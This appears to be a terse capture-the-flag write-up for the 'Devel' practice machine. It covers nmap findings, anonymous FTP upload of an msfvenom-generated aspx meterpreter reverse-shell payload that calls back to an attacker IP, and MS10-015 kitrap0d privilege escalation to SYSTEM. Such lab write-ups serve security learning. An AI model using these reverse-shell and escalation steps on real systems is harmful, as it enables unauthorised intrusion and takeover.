----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Devel
# 20/3/2023
10.10.10.5

----------------------------------------------------
# nmap
----------------------------------------------------
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5



└─$ ftp 10.10.10.5    
anonymous

```
----------------------------------------------------
# exploitation
----------------------------------------------------
```
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=6969 -f aspx -o exploit.aspx -a x86
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f aspx > devel.aspx


anonymous
put exploit.aspx
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run -j
http://10.10.10.5/exploit.aspx
we got a shell
```
----------------------------------------------------
# exploitation
----------------------------------------------------
```
meterpreter > cd Windows\\Temp\\
use multi/recon/local_exploit_suggester
run
use exploit/windows/local/ms10_015_kitrap0d
run 
we got root
```
